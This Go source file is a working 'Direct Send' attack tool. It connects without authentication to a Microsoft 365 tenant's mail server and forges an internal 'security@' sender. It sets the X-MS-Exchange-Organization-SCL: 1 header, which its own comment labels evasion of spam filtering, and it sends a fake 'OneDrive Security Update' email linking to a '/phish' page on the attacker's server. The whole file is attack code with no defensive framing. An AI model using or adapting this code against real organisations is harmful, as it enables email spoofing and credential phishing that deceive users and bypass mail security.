package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net/smtp"
	"strings"
)

func sendDirectSMTP(to, from, subject, body, mxServer string) error {
	// Evasion: Build message with low SCL
	msg := fmt.Sprintf("To: %s\r\nFrom: %s\r\nSubject: %s\r\nX-MS-Exchange-Organization-SCL: 1\r\n\r\n%s", to, from, subject, body)
	
	// Dial MX (port 25, no auth)
	c, err := smtp.Dial(mxServer + ":25")
	if err != nil {
		return err
	}
	defer c.Close()

	if err = c.Mail(from); err != nil {
		return err
	}
	if err = c.Rcpt(to); err != nil {
		return err
	}
	w, err := c.Data()
	if err != nil {
		return err
	}
	_, err = w.Write([]byte(msg))
	if err != nil {
		return err
	}
	err = w.Close()
	if err != nil {
		return err
	}
	c.Quit()
	return nil
}

func main() {
	// Example: Spoof internal From, send to tenant user
	err := sendDirectSMTP("user@NETORGFT4679501.onmicrosoft.com", "security@NETORGFT4679501.onmicrosoft.com", 
		"OneDrive Security Update", "Click <a href='https://your-ip:8443/phish'>here</a> to update.", 
		"NETORGFT4679501.onmicrosoft.com")  // MX server
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Direct Send complete – check inbox.")
}
